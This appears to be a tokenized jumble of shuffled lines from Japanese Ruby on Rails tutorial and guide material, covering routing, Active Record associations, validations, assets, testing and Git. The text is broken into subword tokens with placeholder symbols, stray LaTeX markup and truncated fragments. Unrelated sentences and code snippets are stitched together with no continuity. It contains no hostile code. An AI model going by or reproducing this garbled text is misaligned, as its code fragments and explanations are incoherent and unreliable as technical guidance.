▁これらの ラベル によって 、 リスト \ ref { code : error _ messages _ css } のように エラーメッセージ を SCSS で 整 形 することができます ▟ ここでは 、 Sass の \ k ode {@ ext end } 関数 を使って Bootstrap の \ k ode { has - error } という CSS クラスを 適用 してみます 。
▁prepar ed _ state ment s : ▁false
▁ この節 の 目標は 、 この み っ とも ない ページを 改造 して 図 \ ref { fig : signup _ mockup } のモックアップ のような ページに 変 え ること です 。
▁# ▁ 現在 時刻 を デフォルト値 に 持つ 時刻 セレクト ボックス を生成する
▁上 は Ruby ▁1▖ 8 の場合 、` nil ` に対して ` [ nil ]` を返し 、 それ以外の 場合には ` Array ( object ) ` を呼び出します
▁ / logout
▁上の 場合 、` title ` という名前の ローカル変数 に " Product s ▁P age " という 値 が含まれ ており 、 パーシャル から この 値 にアクセス できます 。
▁create ▁test / fixtures / users ▖ yml
▁* ▁` ActiveRecord :: Connection Adapters :: Connection Management ` は 、 リクエスト ごとに ア ク ティブ な 接続 を ク リ ア します ▟ ただし リクエスト 環境で ` rack ▖ test ` キー が ` true ` に設定され ている 場合 を 除 きます 。
▁Rails は 、 どの プリプロセッサ を使用する か を 、 ファイル名 の 拡張子 を使用して 判 断 します ▟ 最も 一般的な 拡張子 は 、 Sass 用の \ k ode { ▖ scss } 、 CoffeeScript 用の \ k ode { ▖ coffee } 、 埋め込み Ruby ▁( ERb ) ▁ 用の \ k ode { ▖ erb } です 。
▁ この問題 を解決する ために 、 Rails の バージョン番号 順に 並 んだ Ruby インストーラ の リスト を作成し てもらう よう N ic と W a y ne に 働 き かけ ています 。
▁### ▁` load `
▁( Proc や ラ ム ダ は Ruby の トピック としては や や 高度な 部 類 に含まれる ので 、 今 すぐ わ から なくても 心 配 する必要はありません ▟)
▁ 先ほど 作成した Rails アプリケーションは 、 既に 実行 可能な 状態 になっています 。
▁`: association _ foreign _ key ` オプションを使用すると 外部キー の名前 を直接 指定 することができます 。
▁< link ▁ href ="/ assets / application - 4 d d 5 b 10 9 e e 34 3 9 d a 5 4 f 5 b d fd 78 a 80 4 7 3 ▖ css " ▁ media =" screen " ▁ rel =" stylesheet " ▁/>
▁また 、 以下の 埋め込み Ruby は
▁=> ▁" production "
▁### ▁` Rails :: Railtie # initializer `
▁ 接続 が 行 え な くなる と 、 以下のような タ イ ム ア ウ ト エラー が ス ロー されます 。
▁次に 、 リスト \ ref { code : relationships _ access _ control } の テストをパスさせ るために 、\ k ode { logged \_ in \_ user } フィルター を Relationship s コントローラのアクション に対して 追加します ▁( リスト \ ref { code : relationships _ controller }) 。
▁ 当 然 ながら 、 コンテンツ を 出力 したい ファイル に対して 適切な アクセス 権 が与えられ ている 必要があります 。
▁#
▁ユーザー モデルオブジェクト 経由で アカウントを有効化する
▁`: controller ` オプションは 、 リソース で使用する コントローラ を明示的に指定 します 。
▁ 能動的関係 に対して 1 対 多 ▁(\ k ode { has \_ many }) ▁ の関連付け を実装する
▁ 結果 を確認する には 、\ ref { sec : rails _ server } に従って 以下のように Rails の development サーバーを起動 します 。
▁Rails には 、 さまざまな データモデル 同士 を 関連付け を定義する ための 組み込み 関数 が 多数 用 意 されている 。
▁ ting ▁tests ▁are ▁\ failing ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - d 0 d 59 d ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁partial _ refactoring ▁( end )╼╼ ▁% ▁section ▁ showing _ users ▁( end )╼╼ ▁\ section { ユーザーを削除する } ▁% ▁( fold )╼ ▁\ label { sec : deleting _ users }╼╼
▁ 特定の 年 齢 の クライアント の 数を 数 え る のであれば 、` Client ▖ count (: age ) ` とします
▁id = \ text tt {1} のユーザー を編集する ページ
▁Load ing ▁Spork ▖ pre for k ▁block ▖▖▖
▁User ▖ active ▖ merge ( User ▖ inactive )
▁ / signup
▁このとき 、\ k ode {@ feed _ items } の各 要素 が \ k ode { Micropost } クラスを 持 って いた ため 、 Rails は Micropost の パーシャル の 呼び出す ことができ ました 。
▁case ▁role
▁上 は ` Admin :: User Permission s ` に ルーティング されます 。
▁### ▁Rails リポジトリを ク ロー ン する
▁[ 0, ▁true , ▁ String ] ▖ to _ param ▁# ▁=> ▁" 0 / true / String "
▁これらの メソッド には 単数形 の別名 もあります 。
▁User モデル の内容は {0}{1} リスト 2▖ 6 {/1}{/0} に あります ▟ 驚 く ほど シンプルな 内容 ですが 、 継 承 ▁(\ ref { sec : inheritance _ hierarchies } および \ ref { sec : ruby _ classes }) ▁ によって 多くの 機能 が 備わっています 。
▁ 同じ 接続 情報を URL 化 して 、 以下のように 環境変数 に保存 することもできます 。
▁t ▖ string ▁: image able _ type
▁\ label { table : static _ pages } }╼\ end { table }╼╼ ▁\ subsection { タイトル をテストする ▁( R ed )} ▁% ▁( fold )╼ ▁\ label { sec : testing _ title s }╼╼
▁( ここでは \ ref { sec : green } ▁ の 途中 で紹介した ▁\ k ode { touch } ▁ コマンド を使っています が 、 ファイルが 作成 できる なら ▁[ 新規 ファイル 作成 ] ▁ や 他の コマンド でも 問題ありません ▟)
▁リスト \ ref { code : branch _ raise } のコード が 正 常 でない ことが わ か った 以上 、 これは もちろん 問題 です 。
▁ここで テストスイート を実行して 、 テストが 失敗する ことを確認します 。
▁| ▁app / views / comments / ▁| ▁ コントローラの ビュー は ここに お か れる ▁|
▁ アプリケーションで カスタム Gravatar を 利用 できるように するために 、\ k ode { update _ attributes } ▁(\ ref { sec : updating _ user _ objects }) ▁ を使用して データベース上の ユーザー情報 を更新し ます 。
▁\ k ode { Microposts Controller } クラスにおける継承
▁この コントローラの index アクション は以下のようになります 。
▁ 例 :
▁図 \ ref { fig : signin _ page _ protected _ mockup _ bootstrap } のように 転 送 させる 仕 組み を実装 したい ときは 、 Users コントローラ の中で \ emph { before フィルター } を使います 。
▁invoke ▁resource _ route
▁Rails の ヘルパー メソッドを使用して デバッグ モード をオンに することもできます 。
▁* ▁最初の 単語 だけ 冒 頭 の 文字 を 大文字 に します ( capitalize ) 。
▁次に \ k ode { hello _ app } という Rails アプリ の最初の サンプル 作成 に取りかかりま す 。
▁production 環境 の Rails サーバー から ▁( 中 間 キャッシュ を使用 せずに ) ▁ 直接 アセット を提供 している のであれば 、 アプリケーション と ブラウザの 間 で CDN を使用する のが ベ スト プ ラ ク テ ィ ス です 。
▁これにより 、 必要 が生じ たときに ランダム 文字列 を変更 するのに 十分 な 柔 軟 性 が 得られます 。
▁Rails のデフォルトの レイアウト には 、 以下の行 が追加され ていること にも ご 注 目 ください 。
▁ 既に 説明したように 、 この ヘルパー を呼び出す と ` Article sController ` の ` show ` アクション が呼び出され 、` show ▖ html ▖ erb ` テンプレート が 描画 されます 。
▁ユーザー / リレーションシップ の \ k ode { belongs _ to } 関連付け をテストする 。
▁たとえば Customer モデル Order モデルを 連結 する 場合 、 c は o より 辞書 で 先に 出 現 する ので ▁" customers _ orders " ▁という デフォルトの 結合テーブル 名 が使用されます 。
▁raise ▁e ▁unless ▁e ▖ is _ missing ?
▁has _ many ▁: assemblies , ▁through : ▁: manifest s
▁Rails の scaffold は 、\ k ode { rails ▁generate } スクリプト に \ k ode { scaffold } コマンドを 渡す ことで 生成されます 。
▁module ▁ ActionView
▁ セッション フォーム と ユーザー登録フォーム の 最大 の違い は 、 セッション には Session モデル という が なく 、 そのため \ k ode {@ user } のような インスタンス変数 に相当 する もの も ない 点 です 。
▁ テスト に 使用できる 手 頃 な アプリケーションが 見当たらない 場合は 、 エンジンの ディレクトリ の 外 で 以下の ` rails ▁new ` コマンドを実行 して アプリケーション を作成してください 。
▁* ▁` config ▖ action _ dispatch ▖ encrypted _ signed _ cookie _ s alt ` は 、 署 名 暗号化 済み cookie 用の s alt 値 を設定します 。
▁42 ▁files ▁changed , ▁ 8 4 6 1 ▁insert ion s ( + ), ▁0 ▁deletion s ( - )
▁d ▖ end _ of _ month ▁# ▁=> ▁Mon , ▁31 ▁May ▁2010
▁`: space r _ template ` オプションを使用すると 、 主要な パーシャル 同士 の 間 を 埋 め る 第 二 の パーシャル を指定することができます 。
▁ 重要なのは 、 そのオブジェクト そのもの ではなく 、 そのオブジェクト が 属 している \ emph { クラス } ▁( この場合は \ k ode { User } クラス ) ▁ の方 です 。
▁ だ から こ そ 、 どんな に 小 規 模 であっても よい ので ビューで \ emph { 何らかの } テスト を行って お く ことが 重要な のです ▟)
▁$ ▁git ▁remote ▁add ▁ upstream ▁ https :// github ▖ com / rails / rails ▖ git
▁これらの 条件 から 、 フォロー されている ユーザー に対応する id の配列 が必要 であること が わ か って きました 。
▁ 一時 ファイル
▁ 他の バリデーション と同様 、` validates _ with ` ヘルパー でも `: if `、`: unless `、`: on ` オプションを 取 ることができます 。
▁特定の属性にアクセスするための 、 隠 された input タグを返します 。
▁` P er m it S crubber ` および ` T ar get S crubber ` という 2 つの ス ク ラ バー が 新たに 追加 されました 。
▁デフォルトは ` true ` です 。
▁ メンバー ▁( member ) ▁ ルーティング を追加 したい場合は 、` member ` ブロック を リソース ブロック に 1 つ 追加します 。
▁module ▁Article s Helper
▁この 関連付け は 、2 つの モデルの 間 に 「 第 3 の モデル 」( 結合 モデル ) が 介 在 する 点が 特 徴 です ▟ それによって 、 相手 モデルの 「 0 個 以上 」 のインスタンス と マッチ します 。
▁ どの メールアドレス で 失敗した のか を知る こと は非常に 便利です ▟ そこで リスト { p 0} では 、 {2} each {/2} メソッドを使って 各 メールアドレスを 順に テスト しています ▟ ループ さ せずに テスト すると 、 失敗した 行 番号 から と メールアドレス の 行 数を 照 ら し 合わせ て 、 失敗した メールアドレスを 特定 する といった 作業 が発生し てしまいます 。
▁=> ▁0 ▖ ▖ 9
▁belongs _ to ▁: client
▁#### ▁ div _ for
▁| ▁| ▁4 06 ▁| ▁: not _ accept able ▁|
▁# ▁=> ▁ { ' 200 9 - 0 32 ' ▁=> ▁< Invoice ▁▖▖▖
▁ 一意性 の 制 約 を 外 す こともできます 。
▁\ ref { sec : the _ flash } で 触れ た ように 、 flash 用の HTML ▁( リスト \ ref { code : layout _ flash }) ▁ は 読み にくい です 。
▁\ k ode { dependent : ▁: destroy } のテスト
▁Guard 使用 時の Spring と Git の 競 合 を防ぐ には 、\ k ode { ▖ gitignore } ファイルに \ k ode { spring / } ディレクトリ を追加します ▟ ▖ gitignore は Git の 設定ファイル のひとつ で 、 ここで 指定された ファイルは Git レ ポ ジ ト リ に 追加 され なくなります 。
▁ 実際の コードは 少し 複 雑 ですが 、 フレンドリーフォワーディング のテスト は非常に シ ン プ ル に 書く ことができます ▟ ログイン した 後に 編集 ページ へのアクセス する 、 という 順序 を 逆に して あ げ る だけです ▁( リスト \ ref { code : edit _ tests _ logged _ in }) 。
▁ デフォルト値 は `: type ` 値を 大文字 にした ものです ▁( " A T O M " ▁ や ▁" RSS " ▁ など ) 。
▁invoke ▁resource _ route
▁{0}{1} 第 5 章 {/1}{/0} では 、 この章 で学んだ 内容 を サンプルアプリケーションの 開発 に 活 か していきます 。
▁ uni code 文字 を使用する ルーティング を直接 描 出 できるようになりました 。
▁ ついに ユーザー登録 が完成しました ▟ 名前 を ▁“ Rails ▁Tutorial ” 、 メールアドレスを ▁“ example @ railstutorial ▖ org ” として 登録 してみましょう ▁( 図 \ ref { fig : first _ signup }) 。
▁ メールアドレスを 小文字 に するときに も メソッド 参 照 が 使用される 機 会 がある ことにご注目ください 。
▁admin ▖ validates ▁: password , ▁length : ▁ { ▁ minimum : ▁10 ▁ }
▁CDN 上の 同じ URL に対して 次の リクエスト が発生する と 、 キャッシュ された コピー が ヒ ッ ト します 。
▁この フォーム と 、 それ に 関連付けられた ルーティング が 定義 される ことで 、 フォーム に 記 入 して 送信 ボタン を クリック すると 新しい 記事 作成 プロセス が 開 始 される ようになります 。
▁* ▁` Rack :: MethodOverride ` は 、` params [: _ method ]` が設定され ている 場合に メソッド を上書き できるようにします 。
▁最後に 、\ emph { Ruby ▁on ▁Rails チュートリアル } で使用されている 多くの サンプル コードを わかりやすく 記 述 するために 、2 つの 工 夫 を加え ました 。
▁ ブロック が 完了 すると 、` atomic _ write ` は ファイル ハ ンド ル を ク ロー ズ して 処理を 完了 します 。
▁Rails では 、 データモデル で使用する デフォルトの データ構造 の ことを \ emph { モデル } と呼びます ▁(\ ref { sec : mvc }{/ 1 で言う MVC の M の ことです ) 。
▁この 文字列 は 環境 の違い により 上 記 の もの と 少し 異なる かもしれませんが 、 他の 部分 は ほぼ 同じ はずです 。
▁scaffold で生成された 膨大な コードを 今 詳 細 に 読む 必要はありません ▟ 今 の 段階で は おそらく 混 乱 するだけで しょう 。
▁ 具体的には リスト \ ref { code : name _ presence _ test } のように 、 まず \ k ode {@ user } 変数 の \ k ode { name } 属性 に対して 空白 の 文字列を セット します ▟ そして 、\ k ode { assert _ not } メソッドを使って ▁User オブジェクトが 有効 で なく な った ことを確認します 。
▁ weeks _ ago
▁ 標準 の イニシャライザ を使用したい場合 も同様です 。
▁C ▖ descendants ▁# ▁=> ▁[]
▁# ▁app / controllers / users _ controller ▖ rb
▁### ▁ ミドルウェアスタック を調べる
▁Home ページに ステータスフィード を追加する
▁url _ field _ tag ▁' url '
▁ 結果は 図 \ ref { fig : sqlite _ database _ browser } の よう になるので 、 図 \ ref { fig : user _ model _ initial } と 比 べ てみてください 。
▁ SELECT ▁" articles "▖" id " ▁AS ▁t 0 _ r 0, ▁▖▖▖ ▁" comments "▖" updated _ at " ▁AS ▁t 1 _ r 5 ▁FROM ▁" articles " ▁ LE F T ▁ OUT ER ▁JOIN ▁" comments " ▁ ON ▁" comments "▖" article _ id " ▁= ▁" articles "▖" id " ▁WHERE ▁( comments ▖ visible ▁= ▁1)
▁ これはリスト \ ref { code : preventing _ unactivated _ signin s } で使用されていました 。
▁` collection << ` メソッドは 、1 つ 以上の オブジェクトを コレクション に追加します ▟ このとき 、 追加される オブジェクトの 外部キー は 、 呼び出し 側 モデルの 主キー に設定されます 。
▁Web ページの 典型的な HTML 構造
▁╼╼\ end { aside }╼╼\ section { はじめ に } ▁% ▁( fold )╼\ label { sec : in tr o duction }╼╼
▁$ ▁ cd ▁action mailer
▁ ユーザーを 認 証 でき たら 、 ユーザーの ステータス を 「 有効化 されていない 」 から 「 有効化 済み 」( activated ) ▁ に 変更 する 。
▁この メソッド名 は ` render ▁: not h ing ` よりも 動作を 明 確 に 表 しています 。
▁Date ▖ new (201 0, ▁4 , ▁30 )▖ months _ ago (2) ▁# ▁=> ▁Sun , ▁28 ▁Feb ▁2010
▁これで 、 ユーザー情報 が 無効な 場合 の テストスイート が 緑色 ▁( 成功 ) ▁ になりました 。
▁ここでは `: article ` という シンボル を 渡します 。
▁HTTP リクエスト ヘッダ で使用されている フィールド の中に は Re f er er 、 User - A g ent ▁( クライアント側 ソフトウェア ) 、 Cookie フィールド があります 。
▁ ユーザーを削除する アクション
▁create ▁app / views / users / _ form ▖ html ▖ erb
▁# ▁=> ▁< input ▁id =" url " ▁name =" url " ▁type =" url " ▁/>
▁ 前述の 簡潔 な 記 法 を \ k ode { current _ user } メソッドに 適用 した結果 を リスト \ ref { code : current _ user } に示します 。
▁ このような 左 右 非 対 称 な 関係 性 を見 分ける ために 、 それぞれ を \ emph { 能動的関係 ▁( Active ▁Relationship )} と \ emph { 受動的関係 ▁( P as s ive ▁Relationship )} と呼ぶ ことにします ▟ たとえば 先ほど の 事例 のような 、 Calvin が Hobbes を フォローしている が 、 Hobbes は Calvin を フォロー していない 場合 では 、 Calvin は Hobbes に対して 「 能動的関係 」 を持っている ことになります ▟ 逆に 、 Hobbes は Calvin に対して 「 受動的関係 」 を持っている ことになります
▁ ╼\ end { enumerate }╼╼ ▁% ▁subsection ▁login _ upon _ signup ▁( end )╼╼ ▁% ▁section ▁login _ success ▁( end )╼╼ ▁\ section { ログアウト } ▁% ▁( fold )╼ ▁\ label { sec : logging _ out }╼╼
▁* ▁ ルーティングヘルパー を使用して パス や URL を 自動生成 する方法
▁Active ▁Record で サポート される コールバック の種類 の詳細については 、 Rails ▁Guides の 「\ href { http :// guides ▖ rubyonrails ▖ org / v 3 ▖ 2▖1 3 / active _ record _ validations _ callback s ▖ html } { コールバック について } ▁( 英語 )」 を参照してください 。
▁<%= ▁render ▁[ customer 1, ▁ employee 1, ▁customer 2, ▁ employee 2 ] ▁%>
▁ ファイルの 移動 や リ ネ ーム
▁following
▁<%= ▁render ▁template : ▁" layouts / application " ▁%>
▁図 \ ref { fig : cloud 9 _ new _ workspace } に示したように 、「 rails - tutorial 」( 「 rails _ tutorial 」 に \ emph { しない } よう ご注意ください ) ▁という ワークスペース 名を 入力 し 、[ P ri v ate ▁to ▁the ▁people ▁I ▁in v ite ] ▁ を 選択 し 、 Rails チュートリアル の アイコン ▁( Ruby ▁on ▁Rails の アイコン では \ emph { ありません }) ▁ を設定します 。
▁$ ▁ cd ▁ workspace /
▁* ▁ アセット マニフェストファイル ▁( ` application ▖ js ` および ` application ▖ css ` )
▁ アプリケーションの データベース が動作する ように するには 、 以下を実行して 本番 データベースの マイグレーション を行う 必要もあります 。
▁ RSS フィード
▁( 注意 : ▁ここで 使用している \ k ode { respond _ to } は 、 RSpec の例 で 使用している \ k ode { respond _ to } とは 別 物 です ) 。
▁# ▁via ▁a ▁model
▁ nd ╼ ▁end ╼ end ╼\ end { code }╼\ end { code listing }╼╼ ▁% ▁subsection ▁scope s _ subselect s _ and _ a _ lambda ▁( end )╼╼ ▁\ section { 最後に } ▁% ▁( fold )╼ ▁\ label { sec : following _ co nclusion }╼╼
▁ アプリケーションの 他の 部分 と同様 、 ルーティング 部分 も テスティング 戦 略 に含め ておく べ き でしょう 。
▁ 必要であれば 、 いつものように コードを プッシュ して 展開 します 。
▁</ div >
▁### ▁ デ ィ ー プ 複 製
▁NOTE : ▁` root ` ルーティング が アクションに 渡 せる のは ` GET ` リクエスト だけです 。
▁作成した コードをリスト \ ref { code : micropost _ instance _ variable } に示します
▁ ビューテンプレート で 以下のような フィールド を用意し ます 。
▁### ▁`: on `
▁[ 0, ▁1, ▁- 5 , ▁1, ▁1, ▁" foo ", ▁" bar "] ▖ split (1)
▁ 驚 いた ことに 、 公式 標準 による と \ k ode {" Michael ▁Hartl " @ example ▖ com } のような ク ォ ート と スペース を使用した メールアドレス も 有効な の だ そう です 。
▁╼╼\ subsection { 本章の まとめ } ▁% ▁( fold )╼\ label { sec : advance d _
▁ パスワードの再設定 が成功した 場合
▁@ ips ▖ include ?(
▁このメソッドは `: through ` オプション と併用する ときに 特に 便利です 。
▁最初に 、 master と 自分の 変更 の d if f 以外に 差 分 がない ことを確認します 。
▁Rails ▖ application ▖ config ▖ before _ initialize ▁do
▁Rails コンソール では 、 スタック から 抜 け る には Ctrl - C を 押 し 、 完全に コンソール を 終 了 するには Ctrl - D を 押 します 。
▁* ▁` app / views / layouts / application ▖ html ▖ erb `
▁これ と同じ 結果を 得 られる サブ テンプレート の使用 法 はこの 他にも さまざまな もの が考えられます 。
▁という Sample アプリケーションの コード です ▁( リスト \ ref { code : home _ root _ route }) 。
▁### ▁ ORM フレームワーク として の Active ▁Record
▁ 本チュートリアル を 進 め ていれば 、 どうやって も 手順 に 書 いて ある とおり に 動かない こと がある でしょう 。
▁ 自分の コードを Rails に追加する のであれば 、 以下の 点を 心 が け てください 。
▁| ▁test / fixtures / comments ▖ yml ▁| ▁ テスト で使用する サンプル コメント ▁|
▁ エンジン が生成され ると 、` test / dummy ` ディレクトリ の下に 小 規 模 な ダ ミ ー アプリケーション が自動的に 配置 されます 。
▁ ご 存 じ のように 、 Rails の コントローラは リクエスト を扱う プロセス 全体 の 流れ を 組 織 的に 調 整 する 責 任 を 負 い 、( ビ ジ ネ ス ロ ジ ッ ク のような ) ▁ 重 い 処理 は モデルの 方 で 行なう のが普通です 。
▁$ ▁rails ▁generate ▁controller ▁StaticPages ▁ home ▁help ▁-- no - test - framework
▁これで 、 ルーター によって ` / patients / 17 ` という パス が生成されます 。
▁* ▁[ R ailscasts : ▁ Turbolinks ]( http :// r ailscasts ▖ com / episodes / 3 9 0 - turbolinks ? language = ja & view = as ci ic a st ) ▁( 日本語 )
▁次に 、 テスト データ をいくつか 揃 えます ▟ リレーションシップ 用の fixture に データ を追加しましょう 。
▁class ▁ Admin Mailer ▁< ▁ ActionMailer :: Base
▁リスト \ ref { code : password _ resets _ resource } の Password Re set s リソース で 提供され る RESTful ルーティング
▁( Application ヘルパー を インクルード することで 、 リスト { p 0} の {2} full _ title {/2} ヘルパー が 利用 でき ている点に注目してください { p 3 }) 。
▁ 上で 見た とおり 、` Array ` のインスタンス を 複 製 して 別の オブジェクトが できた ことにより 、 一 方 を変更 しても 他 方は 変更 されない ようになりました 。
▁Rails ▁3 ▖ x では cookie ベースの セッション への 署 名 は 行われます が 暗号化 は 行われ ません 。
▁ 結果は {0}{1} 図 2▖1 3 {/1}{/0} の よう になるはずです 。
▁ テストが 揃 っ ていれば 、 コードを 安全 に \ emph { リファクタリング } ▁( 機能 を変更 せずに コードを 改 善 すること ) ▁ できる 。
▁ 本 節 では 、 ユーザーログイン を デフォルトで 保 持 するよう に変更し 、 ユーザーが 明示的に ログアウト する まで は セッションを 期限切れ に しない ようにします 。
▁ ERb によって 実際に 生成される HTML は それ ほど 重要 ではありません が 、 興 味 がある 方 のために 、 次に その 核 心 部分 をお見せします 。
▁詳細については \ ref { sec : sample _ app _ setup } を参照 。
▁has _ and _ belongs _ to _ many ▁: assemblies ,
▁ 前 節 で 基本的な ユーザー ページ の定義 は 終わり ました ので 、 今度は 各 ユーザーの プロファイル 写 真 の あたり を もう少し 肉 付け し 、 サイドバー も 作り 始 め ましょう 。
▁Rails における MVC
▁ 同じ要領で 3 つの 静的ページ を書き換え ます ▁( リスト \ ref { code : title _ tests }) 。
▁def ▁set _ delivery _ options
▁#### ▁` underscore `
▁ 文字列 の 先 頭
▁ コントローラの 継 承 構造 は もう少し だけ 複 雑 です 。
▁` assert _ recognizes ` は ` assert _ generate s ` と 逆 方 向 の テスティング を行います 。
▁ユーザー が作成され 、 図 \ ref { fig : demo _ show _ user _ rails _3} のように \ href { http :// localhost :3000/ users /1 }{\ text tt { show } } ページ が表示されます
▁ 著者 の場合 、\ href { https :// en ▖ w ikipedia ▖ org / wiki / YAML } { YAML } ライブラリ のインストール も 必要 でした 。
▁ これはリスト \ ref { code : user _ show _ page _ test } で使用されていました 。
▁collect ▁ { ▁| e | ▁e ▖ to _ param ▁ } ▖ join ▁' / '
▁\ k ode { README } ファイルの 更新 が終わった ので 、 GitHub に 変更を プッシュ して 結果 を見てみましょう 。
▁この 正規表現 は シナリオ の 中の 行 と マッチ し 、 次の ブロック の内容は 、 その ステップ を実装 するために必要な Ruby のコード です 。
▁Client ▖ order ( orders _ count : ▁: as c , ▁created _ at : ▁: desc )
▁ 先 の例では 、`: log _ level ` は ライブラリ の パ ブ リ ッ ク インターフェイス に 属 さ ず 、 開発 用 途 に のみ 使用されます 。
▁\ k ode { paginate } と同様に 、 関連付けを と お して \ k ode { count } メソッドを呼び出す ことができます 。
▁# ▁ 保存 の 成功 を ここで 扱 う 。
▁`: collection ` オプション を使用して パーシャル に コレクション を渡すと 、 コレクション の メンバ ごとに パーシャル が レンダリング されて 挿入され ます 。
▁#### ▁ 生の コンテンツ を出力する
▁この ` main _ app ` ルーティング プロキシ メソッドを 呼び出し を省略 すると 、 行 き 先 は 呼び出され た 場所 によって アプリケーション または エンジン のいずれか と な って 確 定 しません 。
▁{0} 図 9 ▖6{/0}{1} 保 護 された ページ にアクセス した 直後 の サインイン フォーム ▟\ href { http :// railstutorial ▖ org / images / figures / protected _ sign _ in _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁この ユーザー登録フォーム と サインイン フォームの 主な 違い は 、 サインイン フォーム には Session モデル がない ために \ k ode {@ user } 変数 のような 存 在 がない ことです 。
▁ ユーザー表示ページ に Gravatar の カスタム 画像 が表示されている
▁* ▁` assert _ recognizes `
▁ 自分で 認証システムを 作 って み る
▁<%= ▁image _ tag ▁" home ▖ g if " ▁%>
▁ )╼╼ \ subsection { 本章の まとめ } ▁% ▁( fold )╼\ label { sec : filling _ in _ the _ layout _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼╼\ item
▁* ▁`: primary _ key `
▁te }╼╼ ▁% ▁subsection ▁the _ finished _ signup _ form ▁( end )╼╼ ▁\ subsection { flash } ▁% ▁( fold )╼ ▁\ label { sec : the _ flash }╼╼
▁この ページの 表示 を 図 \ ref { fig : home _ view _ full _ html } に示します
▁( 著者 の場合 、 RVM の gem set も 次の 行 で 指定 しています 。
▁" SQL " ▁という 語 の 前に は 冠 詞 ▁" an " ▁ を付け ること ▁( 例 : ▁" an ▁SQL ▁statement ") 。
▁ まず 、 ユーザーインデックスページ の各 ユーザーに 削除 用の リンク を追加し 、 続いて 管理ユーザー へのアクセス を 制限 します 。
▁ここで 重要なのは 、\ emph { RSpec を使う ために RSpec 独自の 文法 を理解する 必要はない } ということです ▟ 最初の う ち は 魔 法 のように 見え る かもしれませんが 、 RSpec や Capybara は 英語 に 近 い 形で 読 め るように 設計 されています ▟ したがって 、 本チュートリアル で 取り上げ る テスト 例を 読み 進 め る だけで 、 英語 圏 の方 なら RSpec の 文法 を 楽 に 扱えるように なります 。
▁Git を使用して プロジェクト を バージョン管理 下 に 置く ことが できたので 、 今度は \ href { http :// www ▖ bitbucket ▖ com } { Bitbucket } に ソースコード を アップロード してみましょう ▟ Bitbucket は Git リポジトリ の ホスティング と 共有 に 特 化 した サイト です
▁render ▁" edit ▖ html ▖ erb "
▁\ ref { sec : cha n g ing _ the _ layout _ links } では 、 アプリケーションの レイアウト 上の リンク を変更する 予定です ▟ この リンクをクリックすると 、 現在 ログ オン している ユーザーの プロフィール が表示されます 。
▁Ruby をインストール し 、 Rails などの サポート ソフトウェア を 一 から すべて インストール する 練 習 は 、 たとえ ベ テ ラン Rails 開発者 にとって も 、 退屈 な 作業 になる ことでしょう 。
▁$ ▁rake ▁ blorgh : install : migrations
▁is ▁the ▁sample ▁application ▁for ▁the ▁tutorial ▖
▁on
▁#### ▁ レスポンス 分割
▁pa y ment _ type ▁== ▁" card "
▁### ▁JSON の 扱 い の 変更 点
▁< html >
▁もし \ k ode { full _ title } ヘルパー を使って 他の テスト も リファクタリング した く なったら ▁( 例えば リスト \ ref { code : base _ title _ test } など ) 、\ k ode { test _ helper ▖ rb } から Application ヘルパー を インクルード してください 。
▁resources ▁: publish ers ▁do
▁\ k ode { params } ハッシュ が まるごと \ k ode { User ▖ new } に渡され てしまう と 、 どの ユーザー でも \ k ode { admin = ’ 1 ’} を Web リクエスト に 紛 れ 込 ま せる だけで Web サイトの 管理者 権限 を 奪 い 取ること が できてしまいます 。
▁ 一部の D re a m we a ve r のように UT F -8 保存 が デフォルトで ない エディタ であっても 、 デフォルト を UT F -8 に 変更 する方法 は 用 意 されている はずです 。
▁ 長い 単語 を ラ ッ プ させる ヘルパー 。
▁* = ▁require _ tree ▁ ▖
▁Load ing ▁development ▁environment
▁### ▁Article リソース を生成する
▁if ▁@ logger ▖ try (: debug ? )
▁=> ▁" Example ▁User ▁< user @ example ▖ com > "
▁ アプリケーションは 、 このような リクエストを エンジン に ルーティング する方法 を 知 ら ないので 、 明示的に エンジン に ルーティング する必要があります 。
▁ タグ 内に 記載 された もの はすべて Ruby のコード として 評価 されます 。
▁ そのような 場合は 、` bundle ▁update ` ▁ を実行して 正しい 依存関係 バージョン を 反 映 し 、 変更 の ` Gemfile ▖ lock ` ファイルに コミット してください 。
▁edit _ user ▁GET ▁ / users / : id / edit (▖ : format ) ▁users # edit
▁ 私 に この 用 語 を変更する 決 心 を させ て く れ 、 より わかりやす い ア ド バ イ ス を提供 してくれ た 読者 、 Co s m o ▁L e e に 感 謝 いた します
▁{0}{1} 第 10 章 {/1}{/0} では 、 ▁ メールアドレスが \ emph { 本当に } 有効 であること を確かめるため に 、\ emph { アカウントを有効化する } 機能を サインアップ の 手順 に追加します 。
▁` m attr _ reader `、` m attr _ writer `、` m attr _ accessor ` という 3 つの マクロ は 、 クラス 用に 定義 される ` c attr _ * ` マクロ と同じ です 。
▁<%= ▁render ▁" shared / menu " ▁%>
▁ 設定ファイル で ` config ▖ assets ▖ digest ` オプション を使用して フィンガープリント の オン / オフ を 制御 できます 。
▁First ▁name : ▁<%= ▁person _ form ▖ text _ field ▁: first _ name ▁%>
▁リスト \ ref { code : friendly _ forwarding _ test } が 示す ように 、 実際の テストは まず 編集 ページ にアクセス し 、 ログイン した 後に 、( デフォルトの プロフィール ページ ではなく ) ▁\ emph { 編集 } ページに リダイレクト されている かどうか をチェックする といった テスト です 。
▁` app / assets / stylesheets / main ▖ css ` と ` app / assets / stylesheets / columns ▖ css ` を含め る には 、 以下のように します 。
▁ 導 入 後 、 Web サーバ を 再起動 させる と 、 アプリケーションに 反 映 させる ことができます ▁( { p 0} で紹介した ように 、 Ctrl - C を 押 して Web サーバ を 停 止 させた 後 、 {2} rails ▁server {/2} コマンドを 打 って Web サーバ を 起動 してください )▟ うまく い け ば 図 \ ref { fig : sample _ app _ only _ bootstrap } のような 結果 に
▁従って 、 このメソッドは 大 規 模 な クエリ や 使用 頻 度 の高い クエリ で使用する と パフォーマンス が 向上 します 。
▁( それ でも count メソッドが アプリケーションの ボ ト ル ネ ッ ク になる ようなことがあ れば 、 さらに 高速 な \ href { http :// r ailscasts ▖ com / episodes / 23 - counter - cache - column }{\ emph { counter ▁cache } } を使う こともできます ▟)
▁` vendor `、` lib `、` app ` 以下の すべての ディレクトリ 、` config ▖ load _ paths ` で 指定 される すべての パス が ` $ LO A D _ PATH ` に追加されます 。
▁$ ▁ mkdir ▁ workspace
▁* ▁`: location `
